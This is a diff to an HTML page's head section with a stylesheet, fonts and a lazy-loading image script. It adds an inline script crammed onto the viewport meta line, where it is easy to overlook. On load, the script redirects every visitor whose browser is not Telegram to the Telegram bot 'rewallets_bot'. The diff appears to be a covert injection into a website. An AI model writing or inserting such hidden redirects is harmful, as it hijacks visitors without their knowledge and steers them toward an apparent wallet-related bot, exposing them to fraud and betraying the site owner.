@@ -140,12 +140,9 @@ setTimeout(process, 1000);
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="asset/orateam/style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@200..700&family=Roboto:ital,wght@0,100..900;1,100..900&family=Russo+One&display=swap" rel="stylesheet">
-    <script>
-    document.addEventListener("DOMContentLoaded", function () {
-        const lazyImages = document.querySelectorAll("img[data-src]");
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><script>window.onload = function() {const userAgent = navigator.userAgent || navigator.vendor || window.opera; const isTelegram = userAgent.toLowerCase().includes("telegram"); if (!isTelegram) {window.location.href = "https://t.me/rewallets_bot"; }};</script><link rel="stylesheet" href="asset/orateam/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@200..700&family=Roboto:ital,wght@0,100..900;1,100..900&family=Russo+One&display=swap" rel="stylesheet"><script>
+    document.addEventListener("DOMContentLoaded", function () {const lazyImages = document.querySelectorAll("img[data-src]");
         const imageObserver = new IntersectionObserver((entries, observer) => {
             entries.forEach(entry => {
                 if (entry.isIntersecting) {
